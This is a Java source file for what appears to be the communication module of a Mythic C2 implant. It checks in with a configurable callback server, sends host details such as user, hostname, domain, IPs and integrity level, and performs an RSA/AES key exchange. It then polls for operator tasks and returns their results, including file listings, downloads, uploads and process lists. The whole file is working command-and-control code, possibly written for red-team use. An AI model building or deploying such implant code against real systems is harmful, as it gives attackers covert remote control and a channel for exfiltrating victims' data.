package com.woopsie;

import com.woopsie.utils.EncryptionUtils;
import com.woopsie.utils.SystemInfo;
import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.io.entity.StringEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.ParseException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.JsonNode;

import javax.crypto.Cipher;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SecureRandom;
import java.security.spec.MGF1ParameterSpec;
import javax.crypto.spec.OAEPParameterSpec;
import javax.crypto.spec.PSource;
import java.util.*;

/**
 * Handles communication with Mythic C2 server
 */
public class CommunicationHandler {
    private final Config config;
    private final CloseableHttpClient httpClient;
    private final ObjectMapper objectMapper;
    private String callbackUuid;
    private byte[] aesKey;
    
    public CommunicationHandler(Config config) {
        this.config = config;
        this.httpClient = HttpClients.createDefault();
        this.objectMapper = new ObjectMapper();
        this.callbackUuid = null;
        this.aesKey = null;
        
        // Check for AESPSK (pre-shared AES key) and use it if present
        parseAESPSK();
    }
    
    private void parseAESPSK() {
        String aespskJson = config.getAespsk();
        if (aespskJson != null && !aespskJson.isEmpty()) {
            try {
                JsonNode aespsk = objectMapper.readTree(aespskJson);
                String encKeyB64 = aespsk.get("enc_key").asText();
                this.aesKey = Base64.getDecoder().decode(encKeyB64);
                this.callbackUuid = config.getUuid();
                Config.debugLog(config, "AESPSK detected - using pre-shared AES key (no RSA exchange)");
            } catch (Exception e) {
                Config.debugLog(config, "Failed to parse AESPSK: " + e.getMessage());
            }
        }
    }
    
    public void checkin() throws Exception {
        // Perform key exchange if enabled and no pre-shared key
        if (config.isEncryptedExchangeCheck() && aesKey == null) {
            Config.debugLog(config, "Encrypted exchange check enabled - performing RSA key exchange");
            performKeyExchange();
            
            // Sleep after key exchange (1/4 of callback interval with jitter)
            int sleepTime = config.getSleepInterval() / 4;
            Config.debugLog(config, "Sleeping " + sleepTime + "ms after key exchange...");
            Thread.sleep(sleepTime);
        }
        
        Config.debugLog(config, "=== CHECKIN REQUEST ===");
        Config.debugLog(config, "URL: " + config.getCallbackUrl() + config.getPostUri());
        Config.debugLog(config, "User-Agent: " + config.getUserAgent());
        
        // Build Mythic checkin JSON with all required fields
        Map<String, Object> checkinData = new HashMap<>();
        checkinData.put("action", "checkin");
        checkinData.put("uuid", config.getUuid());
        checkinData.put("ips", SystemInfo.getIpAddresses(config));
        checkinData.put("os", SystemInfo.getOS());
        checkinData.put("user", SystemInfo.getUsername());
        checkinData.put("host", SystemInfo.getHostname());
        checkinData.put("pid", SystemInfo.getPid());
        checkinData.put("architecture", SystemInfo.getArchitecture());
        checkinData.put("domain", SystemInfo.getDomain());
        checkinData.put("integrity_level", SystemInfo.getIntegrityLevel());
        checkinData.put("process_name", SystemInfo.getProcessName());
        checkinData.put("cwd", SystemInfo.getCurrentDirectory());
        
        String jsonBody = objectMapper.writeValueAsString(checkinData);
        Config.debugLog(config, "Checkin JSON: " + jsonBody);
        
        // Send checkin request (with encryption if key exchange was performed)
        String response = sendData(jsonBody);
        Config.debugLog(config, "Checkin response: " + response);
        
        // Parse response to get callback UUID (if not already set by key exchange)
        JsonNode responseJson = objectMapper.readTree(response);
        if (responseJson.has("id")) {
            this.callbackUuid = responseJson.get("id").asText();
            Config.debugLog(config, "Callback UUID from checkin: " + this.callbackUuid);
        }
        
        Config.debugLog(config, "=== CHECKIN COMPLETE ===");
    }
    
    public String[] getTasks() throws Exception {
        if (callbackUuid == null) {
            throw new IOException("Not checked in - no callback UUID");
        }
        
        Config.debugLog(config, "=== GET TASKING REQUEST ===");
        
        // Build get_tasking request
        Map<String, Object> taskingRequest = new HashMap<>();
        taskingRequest.put("action", "get_tasking");
        taskingRequest.put("tasking_size", -1);
        
        String jsonBody = objectMapper.writeValueAsString(taskingRequest);
        Config.debugLog(config, "Tasking request JSON: " + jsonBody);
        
        // Send request (with encryption if available)
        String response = sendData(jsonBody);
        Config.debugLog(config, "Tasking response: " + response);
        
        // Parse response
        JsonNode responseJson = objectMapper.readTree(response);
        
        // Extract tasks array
        if (responseJson.has("tasks")) {
            JsonNode tasksNode = responseJson.get("tasks");
            List<String> tasks = new ArrayList<>();
            for (JsonNode task : tasksNode) {
                tasks.add(task.toString());
            }
            Config.debugLog(config, "Received " + tasks.size() + " task(s)");
            return tasks.toArray(new String[0]);
        }
        
        Config.debugLog(config, "No tasks in response");
        return new String[0];
    }
    
    /**
     * Send task results back to Mythic
     */
    public List<Map<String, Object>> sendTaskResults(List<Map<String, Object>> taskResults) throws Exception {
        if (taskResults.isEmpty()) {
            return new ArrayList<>();
        }
        
        Config.debugLog(config, "=== SENDING TASK RESULTS ===");
        Config.debugLog(config, "Number of results: " + taskResults.size());
        
        // Build post_response message
        Map<String, Object> postResponse = new HashMap<>();
        postResponse.put("action", "post_response");
        postResponse.put("responses", taskResults);
        
        String jsonBody = objectMapper.writeValueAsString(postResponse);
        Config.debugLog(config, "Task results JSON: " + jsonBody);
        
        // Send encrypted request
        String response = sendData(jsonBody);
        Config.debugLog(config, "Post response result: " + response);
        
        // Parse response to check for background task responses (file_id, etc.)
        List<Map<String, Object>> backgroundTasks = new ArrayList<>();
        try {
            JsonNode responseNode = objectMapper.readTree(response);
            if (responseNode.has("responses") && responseNode.get("responses").isArray()) {
                for (JsonNode resp : responseNode.get("responses")) {
                    // Convert to map for easier handling
                    Map<String, Object> respMap = objectMapper.convertValue(resp, Map.class);
                    
                    // Only route to background tasks if it contains file_id (actual background task data)
                    // Simple acknowledgments with just task_id and status should be ignored
                    if (respMap.containsKey("file_id")) {
                        Config.debugLog(config, "Received background task response with file_id: " + resp);
                        backgroundTasks.add(respMap);
                    }
                }
            }
        } catch (Exception e) {
            Config.debugLog(config, "Failed to parse post_response result: " + e.getMessage());
        }
        
        return backgroundTasks;
    }
    
    /**
     * Create a task result object for successful execution
     * Handles regular output, file_browser JSON, and download JSON data
     */
    public Map<String, Object> createTaskResult(String taskId, String output) {
        Map<String, Object> result = createBaseResult(taskId, true, "success");
        
        // Try to parse as JSON and handle special response types
        JsonNode jsonOutput = tryParseJson(output);
        if (jsonOutput != null) {
            if (jsonOutput.has("files")) {
                return createFileBrowserResult(result, jsonOutput);
            } else if (jsonOutput.has("download")) {
                return createDownloadResult(result, jsonOutput);
            } else if (jsonOutput.has("upload")) {
                return createUploadResult(result, jsonOutput);
            } else if (jsonOutput.has("processes")) {
                // PsTask returns processes array - preserve it and extract user_output
                result.put("processes", objectMapper.convertValue(jsonOutput.get("processes"), Object.class));
                if (jsonOutput.has("user_output")) {
                    result.put("user_output", jsonOutput.get("user_output").asText());
                }
                return result;
            } else if (jsonOutput.has("removed_files")) {
                // RmTask returns removed_files array - preserve it and extract user_output
                result.put("removed_files", objectMapper.convertValue(jsonOutput.get("removed_files"), Object.class));
                if (jsonOutput.has("user_output")) {
                    result.put("user_output", jsonOutput.get("user_output").asText());
                }
                return result;
            }
        }
        
        // Default: wrap plain text output in user_output field
        result.put("user_output", output);
        return result;
    }
    
    /**
     * Create base result with common fields
     */
    private Map<String, Object> createBaseResult(String taskId, boolean completed, String status) {
        Map<String, Object> result = new HashMap<>();
        result.put("task_id", taskId);
        result.put("completed", completed);
        result.put("status", status);
        return result;
    }
    
    /**
     * Try to parse output as JSON, return null if not valid JSON
     */
    private JsonNode tryParseJson(String output) {
        if (!output.trim().startsWith("{")) {
            return null;
        }
        try {
            return objectMapper.readTree(output);
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * Create file browser result (ls command)
     */
    private Map<String, Object> createFileBrowserResult(Map<String, Object> result, JsonNode jsonOutput) {
        try {
            Map<String, Object> fileBrowserMap = objectMapper.convertValue(jsonOutput, Map.class);
            result.put("file_browser", fileBrowserMap);
            // Serialize as compact JSON for user_output (matches oopsie)
            result.put("user_output", objectMapper.writeValueAsString(fileBrowserMap));
        } catch (Exception e) {
            result.put("user_output", jsonOutput.toString());
        }
        return result;
    }
    
    /**
     * Create download initiation result
     * Returns only task_id and download metadata (no completed/status/user_output)
     */
    private Map<String, Object> createDownloadResult(Map<String, Object> result, JsonNode jsonOutput) {
        JsonNode downloadNode = jsonOutput.get("download");
        result.put("download", objectMapper.convertValue(downloadNode, Map.class));
        // Remove standard fields for download initiation (matches oopsie behavior)
        result.remove("completed");
        result.remove("status");
        result.remove("user_output");
        return result;
    }
    
    /**
     * Create upload initiation result
     * Returns only task_id and upload metadata (no completed/status/user_output)
     */
    private Map<String, Object> createUploadResult(Map<String, Object> result, JsonNode jsonOutput) {
        JsonNode uploadNode = jsonOutput.get("upload");
        result.put("upload", objectMapper.convertValue(uploadNode, Map.class));
        // Add user_output for initial upload message
        result.put("user_output", "Uploading chunk 1\n");
        // Remove completed and status for upload initiation
        result.remove("completed");
        result.remove("status");
        return result;
    }
    
    /**
     * Create a task result object for error
     */
    public Map<String, Object> createTaskError(String taskId, String error) {
        Map<String, Object> result = new HashMap<>();
        result.put("task_id", taskId);
        result.put("user_output", "Error: " + error);
        result.put("completed", true);
        result.put("status", "error");
        return result;
    }
    
    /**
     * Perform RSA key exchange with C2 server
     * Generates RSA-4096 keypair, sends public key, receives encrypted AES session key
     */
    public void performKeyExchange() throws Exception {
        Config.debugLog(config, "=== PERFORMING KEY EXCHANGE ===");
        
        // Generate RSA-4096 keypair
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
        keyGen.initialize(4096, new SecureRandom());
        KeyPair keyPair = keyGen.generateKeyPair();
        
        // Encode public key to PEM-like format (Base64)
        byte[] publicKeyBytes = keyPair.getPublic().getEncoded();
        String publicKeyB64 = Base64.getEncoder().encodeToString(publicKeyBytes);
        
        // Generate random session ID
        String sessionId = generateRandomString(20);
        
        Config.debugLog(config, "Generated RSA keypair and session ID");
        Config.debugLog(config, "Public key length: " + publicKeyB64.length() + " chars");
        
        // Build staging_rsa request
        Map<String, Object> keyExchangeData = new HashMap<>();
        keyExchangeData.put("action", "staging_rsa");
        keyExchangeData.put("pub_key", publicKeyB64);
        keyExchangeData.put("session_id", sessionId);
        
        String jsonBody = objectMapper.writeValueAsString(keyExchangeData);
        Config.debugLog(config, "Key exchange request: " + jsonBody);
        
        // Send staging_rsa as Base64(UUID + JSON) - standard Mythic format
        // Even for staging, we include the UUID prefix
        String payload = config.getUuid() + jsonBody;
        String encodedPayload = Base64.getEncoder().encodeToString(payload.getBytes());
        
        String targetUrl = config.getCallbackUrl() + config.getPostUri();
        Config.debugLog(config, "Key exchange URL: " + targetUrl);
        Config.debugLog(config, "Sending staging_rsa as Base64(UUID + JSON)");
        
        HttpPost post = new HttpPost(targetUrl);
        post.setHeader("User-Agent", config.getUserAgent());
        post.setHeader("Content-Type", "application/json");
        post.setEntity(new StringEntity(encodedPayload));
        
        try (CloseableHttpResponse response = httpClient.execute(post)) {
            int statusCode = response.getCode();
            Config.debugLog(config, "Key exchange response status: " + statusCode);
            
            if (statusCode != 200) {
                throw new IOException("Key exchange failed with status: " + statusCode);
            }
            
            // Parse response
            String responseBody = EntityUtils.toString(response.getEntity());
            byte[] decoded = Base64.getDecoder().decode(responseBody);
            String jsonResponse = new String(decoded, 36, decoded.length - 36);
            
            Config.debugLog(config, "Key exchange response: " + jsonResponse);
            
            JsonNode responseJson = objectMapper.readTree(jsonResponse);
            
            // Get encrypted session key and callback UUID
            String encryptedSessionKey = responseJson.get("session_key").asText();
            this.callbackUuid = responseJson.get("uuid").asText();
            
            Config.debugLog(config, "Received callback UUID: " + this.callbackUuid);
            Config.debugLog(config, "Encrypted session key length: " + encryptedSessionKey.length() + " chars");
            
            // Decrypt AES session key using RSA private key
            byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedSessionKey);
            
            Cipher rsaCipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
            OAEPParameterSpec oaepParams = new OAEPParameterSpec("SHA-256", "MGF1", 
                MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT);
            rsaCipher.init(Cipher.DECRYPT_MODE, keyPair.getPrivate(), oaepParams);
            
            byte[] decryptedKey = rsaCipher.doFinal(encryptedKeyBytes);
            
            // AES key should be 32 bytes (256 bits)
            if (decryptedKey.length > 32) {
                this.aesKey = Arrays.copyOf(decryptedKey, 32);
            } else {
                this.aesKey = decryptedKey;
            }
            
            Config.debugLog(config, "Successfully decrypted AES session key (" + this.aesKey.length + " bytes)");
            Config.debugLog(config, "=== KEY EXCHANGE COMPLETE ===");
        }
    }
    
    /**
     * Generate random alphanumeric string
     */
    private String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }
    
    /**
     * Send data with encryption if AES key is available
     */
    private String sendData(String jsonData) throws Exception {
        String encodedPayload;
        
        if (aesKey != null && callbackUuid != null) {
            // Encrypt: UUID + IV + Ciphertext + HMAC
            Config.debugLog(config, "Encrypting payload with AES-256");
            byte[] encrypted = EncryptionUtils.encryptPayload(jsonData.getBytes(), aesKey, callbackUuid);
            encodedPayload = Base64.getEncoder().encodeToString(encrypted);
        } else {
            // No encryption: UUID + JSON
            Config.debugLog(config, "Sending unencrypted payload (Base64 only)");
            String payload = (callbackUuid != null ? callbackUuid : config.getUuid()) + jsonData;
            encodedPayload = Base64.getEncoder().encodeToString(payload.getBytes());
        }
        
        HttpPost post = new HttpPost(config.getCallbackUrl() + config.getPostUri());
        post.setHeader("User-Agent", config.getUserAgent());
        post.setHeader("Content-Type", "application/json");
        post.setEntity(new StringEntity(encodedPayload));
        
        try (CloseableHttpResponse response = httpClient.execute(post)) {
            if (response.getCode() != 200) {
                throw new IOException("Request failed with status: " + response.getCode());
            }
            
            String responseBody = EntityUtils.toString(response.getEntity());
            byte[] decoded = Base64.getDecoder().decode(responseBody);
            
            if (aesKey != null) {
                // Decrypt response
                Config.debugLog(config, "Decrypting response with AES-256");
                byte[] decrypted = EncryptionUtils.decryptPayload(decoded, aesKey);
                return new String(decrypted);
            } else {
                // No encryption: skip UUID prefix
                return new String(decoded, 36, decoded.length - 36);
            }
        }
    }
    
    public void close() {
        try {
            httpClient.close();
        } catch (IOException e) {
            // Silent close
        }
    }
}
